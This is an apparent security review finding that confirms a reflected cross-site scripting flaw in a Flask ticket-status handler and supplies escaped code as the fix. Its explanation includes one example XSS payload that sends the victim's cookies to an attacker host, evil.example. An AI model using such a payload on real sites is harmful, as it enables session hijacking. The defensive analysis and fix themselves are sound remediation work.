## Verdict

Confirmed. Reflected cross-site scripting in `ticket_status()`.

## Source

`ticket_id = request.args.get("ticket", "")` and `priority = request.args.get("priority", "normal")` (lines 12-13) — both are attacker-controlled query-string parameters.

## Fix

```python
from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)


def lookup_ticket_status(ticket_id):
    return "Open"


@app.route("/ticket/status")
def ticket_status():
    ticket_id = request.args.get("ticket", "")
    priority = request.args.get("priority", "normal")

    if not ticket_id:
        return "<p>Please provide a ticket number.</p>", 400

    status = lookup_ticket_status(ticket_id)

    page = "<html><body>"
    page += "<h2>Support Ticket Lookup</h2>"
    page += "<p>Ticket: " + escape(ticket_id) + "</p>"
    page += "<p>Priority: " + escape(priority) + "</p>"
    page += "<p>Status: " + escape(status) + "</p>"
    page += "</body></html>"

    return page
```

## Explanation

The handler builds the response by string-concatenating raw query parameters (`ticket_id`, `priority`) directly into an HTML string, with no encoding at the point where they are written into the markup (lines 22-23). A request such as `/ticket/status?ticket=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` is echoed verbatim into the page body, and the browser executes it as script in the victim's session — a classic reflected XSS via manual HTML construction rather than an auto-escaping template.

The fix wraps every value interpolated into the HTML — `ticket_id`, `priority`, and the value returned by `lookup_ticket_status()` — in `markupsafe.escape()` (the same escaping primitive Flask's Jinja2 layer uses internally), which converts `<`, `>`, `&`, `'`, and `"` into their HTML entity equivalents so the browser renders them as literal text instead of markup. `escape()` is applied to `status` too, defensively, since it does not currently derive from the request but the taint-free-guarantee is not evident to a downstream reader of this snippet — should `lookup_ticket_status` ever start reflecting user-influenced content (e.g., a ticket note), the sink is already safe. A more durable structural fix is to stop building HTML by string concatenation altogether and render through a Jinja2 template (`render_template` / `render_template_string`) instead, since Flask's template autoescaping applies the same neutralization automatically to every interpolated variable and removes the risk of a future edit reintroducing an unescaped `+=` line.
